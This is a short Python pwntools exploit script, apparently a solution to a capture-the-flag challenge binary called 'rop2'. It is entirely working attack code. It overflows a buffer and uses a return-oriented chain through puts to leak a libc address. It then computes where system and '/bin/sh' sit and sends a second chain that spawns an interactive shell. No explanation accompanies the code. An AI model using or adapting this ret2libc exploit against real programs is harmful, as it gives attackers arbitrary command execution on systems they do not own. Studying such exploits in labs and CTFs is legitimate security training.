from pwn import *

r = process('./rop2')
e = ELF('./rop2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

bss = p64(0x404040)
system_off = libc.symbols['system']
puts_off = libc.symbols['puts']
binsh_off = list(libc.search(b'/bin/sh'))[0]
puts_plt = e.plt['puts']

puts_got = e.got['puts']
read_plt = e.plt['read']
readline_addr = e.symbols['readline']
main_addr = e.symbols['main']

pr = p64(0x401243)
ppr = p64(0x401241)
ret = p64(0x40101a)

payload = b'A' *16
payload += pr
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)

r.recvline()
r.sendline(payload)

puts_add = u64(r.recv(7)[:-1]+b'\x00\x00')
system_add = p64(puts_add - puts_off + system_off)

r.recvuntil(b'!\n')

payload = b'A'* 16
payload += pr
payload += p64(binsh_off + puts_add - puts_off)
payload += system_add

r.sendline(payload)

r.interactive()
